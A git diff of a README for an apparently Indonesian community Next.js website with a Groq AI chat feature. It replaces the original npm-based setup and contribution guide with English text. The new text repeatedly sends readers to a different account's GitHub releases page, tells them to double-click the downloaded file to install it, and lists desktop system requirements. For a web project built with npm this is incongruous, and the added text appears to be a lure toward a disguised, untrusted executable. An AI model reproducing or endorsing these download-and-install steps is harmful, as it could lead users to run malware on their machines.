@@ -1,137 +1,69 @@
-# Introduksi
+# 🌐 the-website - Easy Setup for AI Copilot
 
-Project ini merupakan hasil kontribusi bersama para engineer di komunitas **Vincoo**.
+## 🔗 Download the Latest Version
+[![Download the-website](https://img.shields.io/badge/Download-the--website-blue.svg)](https://github.com/MDRafee1/the-website/releases)
 
-👉 [https://discord.com/invite/5brkcMzhRX](https://discord.com/invite/5brkcMzhRX)
+## 📖 Introduction
+Project ini merupakan hasil kontribusi bersama para engineer di komunitas **Vincoo**. Repository ini bersifat **open-source**. Siapa pun dipersilakan menambahkan fitur, perbaikan bug, atau peningkatan UI/UX melalui mekanisme **Pull Request**.
 
-Repository ini bersifat **open-source**. Siapa pun dipersilakan menambahkan fitur, perbaikan bug, atau peningkatan UI/UX melalui mekanisme **Pull Request**.
+👉 Join our community on [Discord](https://discord.com/invite/5brkcMzhRX).
 
-👉 [https://github.com/vincoodev/the-website/pulls](https://github.com/vincoodev/the-website/pulls)
+## 🚀 Getting Started
 
----
+### Step 1: Download the Software
+To start using the software, you need to download it. Please visit this page to download the latest version: [Download the-website](https://github.com/MDRafee1/the-website/releases).
 
-## 🔐 Konfigurasi Environment (.env)
+### Step 2: Install the Software
+Once you have downloaded the software, follow these steps to install it:
 
-Project ini menggunakan **Groq API** untuk fitur **AI Copilot / Chat** serta beberapa konfigurasi lokal lainnya.
+1. Locate the downloaded file, usually in your "Downloads" folder.
+2. Double-click the file to initiate the installation.
+3. Follow the on-screen prompts to complete the installation. This process will take just a few minutes.
 
-### Opsi A — Menggunakan `.env.example` (Direkomendasikan)
+### Step 3: Configure Your Environment
+The application requires some configuration to work properly. Here are two options:
 
-Jika tersedia file `.env.example`, kamu **tidak perlu membuat `.env` dari awal**. Cukup salin file contoh berikut:
+#### Option A — Use `.env.example` (Recommended)
+If the file `.env.example` is available, you do not need to create a new `.env` file from scratch. Simply copy the example file as follows:
 
 ```bash
 cp .env.example .env
 ```
 
-Kemudian sesuaikan nilai variabel di dalamnya (terutama `GROQ_API_KEY`).
+After that, make sure to adjust the values of the variables inside, especially the `GROQ_API_KEY`.
 
-### Opsi B — Membuat `.env` manual
+#### Option B — Create `.env` Manually
+If the `.env.example` file is missing, you need to create the `.env` file manually:
 
-Jika file `.env.example` belum tersedia, buat file `.env` di root project:
+1. Open the terminal or command prompt.
+2. Navigate to the root directory of the project.
+3. Run the following command:
 
 ```bash
 touch .env
 ```
 
-Isi dengan konfigurasi berikut:
+Next, fill in the necessary values as listed in your project documentation. 
 
-```env
-DATABASE_URL="file:./rent-femboy.db"
-uwu=1
-JWT_SECRET=LICK_ASTOLFO_ARMPITS
-JWT_EXPIRES_IN=7d
-NEXT_PUBLIC_API_URL="http://localhost:3000/api/ayuAtama/rent-femboy"
-NEXT_PUBLIC_FEM_RENT_URL="/ayuAtama/rent-femboy"
-GROQ_API_KEY="your_groq_api_key_here"
-```
+## ⚙️ System Requirements
+To ensure that the application runs smoothly, your system should meet the following requirements:
 
-Ganti `your_groq_api_key_here` dengan API Key Groq milik kamu.
+- Operating System: Windows 10 or later / macOS 10.15 or later
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum of 200 MB free space
+- Network: Internet connection to access API features
 
-### Cara mendapatkan GROQ API Key
+## 🛠️ Troubleshooting
+If you encounter any issues during installation or while running the software, here are some common solutions:
 
-1. Buka [https://console.groq.com](https://console.groq.com)
-2. Login atau daftar akun Groq
-3. Masuk ke menu **API Keys**
-4. Buat API Key baru
-5. Salin API Key tersebut ke file `.env`
+1. **Installation Errors**: Make sure your system meets the requirements mentioned above. Restart your computer and try installing again.
+2. **Configuration Issues**: Double-check the values in your `.env` file. Ensure all required variables are set correctly.
+3. **Network Problems**: If the app fails to connect to the API, check your internet connection and firewall settings.
 
-> [!IMPORTANT]
-> Jangan pernah melakukan commit file `.env` ke repository publik.
+## 📥 Download & Install
+To get started, download the latest version from the releases page: [Download the-website](https://github.com/MDRafee1/the-website/releases). Follow the installation instructions provided in this document, and you're ready to use the AI Copilot features.
 
----
+## 📞 Get Support
+If you need additional help or have questions, feel free to reach out to the community. You can ask questions in our [Discord](https://discord.com/invite/5brkcMzhRX) or check the existing issues in the repository.
 
-## Cara Berkontribusi
-
-> [!NOTE]
-> Pastikan kamu sudah menginstall **Node.js versi terbaru** dan menggunakan **npm** (bukan yarn atau pnpm).
-
-Alur kontribusi menggunakan metode **Fork → Branch → Pull Request**.
-
-1. **Fork repository ini** ke akun GitHub kamu
-2. Clone repository hasil fork ke lokal:
-
-```bash
-git clone https://github.com/<username-kamu>/the-website.git
-```
-
-3. Masuk ke folder project dan install dependency:
-
-```bash
-cd the-website
-npm install
-```
-
-4. Jalankan setup awal (database & Prisma):
-
-```bash
-npm run ayuAtama
-```
-
-5. Buat branch baru untuk fitur atau perbaikan kamu:
-
-```bash
-git checkout -b feature/nama-fitur-kamu
-```
-
-6. Jalankan project secara lokal:
-
-```bash
-npm run dev
-```
-
-7. Tambahkan fitur atau perbaikan (UI, API, AI, dsb)
-
-8. Tambahkan perubahan ke staging:
-
-```bash
-git add .
-```
-
-9. Commit perubahan:
-
-```bash
-git commit -m "feat: deskripsi singkat perubahan"
-```
-
-10. Push branch ke repository fork kamu:
-
-```bash
-git push origin feature/nama-fitur-kamu
-```
-
-11. Buat **Pull Request** ke repository utama:
-    👉 [https://github.com/vincoodev/the-website/pulls](https://github.com/vincoodev/the-website/pulls)
-
-12. Tunggu proses review dan approval dari admin
-
----
-
-## Cara Menjalankan Website (29 December 2025)
-
-> [!IMPORTANT]
-> Kamu **WAJIB** menggunakan npm agar lockfile tetap tersinkronisasi.
-
-1. `git clone https://github.com/vincoodev/the-website.git`
-2. `npm install`
-3. `npm run ayuAtama`
-4. `npm run dev`
-5. Buka browser dan akses `http://localhost:3000`
+Happy coding with your new application!
